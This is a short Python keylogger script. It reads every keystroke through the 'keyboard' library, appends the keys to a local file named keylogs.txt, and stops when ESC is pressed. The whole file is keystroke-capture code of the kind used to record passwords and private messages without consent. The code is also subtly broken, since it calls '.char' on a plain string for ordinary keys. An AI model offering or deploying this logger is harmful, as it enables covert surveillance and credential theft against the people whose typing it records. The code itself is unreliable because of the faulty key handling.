import keyboard
import time

def main():
    with open("keylogs.txt", "a") as f:
        while True:
            event = keyboard.read_event()
            
            if event.name == 'esc': # Press ESC to stop the script
                break
            elif event.event_type == keyboard.KEY_DOWN:
                key = event.name
                if len(key) > 1: # Special keys like 'shift', 'ctrl' etc.
                    f.write(str(key))
                else: # Regular alphanumeric characters
                    f.write(key.char)
                f.flush() # Write changes to the file immediately
                print("Key logged:", key) # Debug print statement

if __name__ == "__main__":
    main()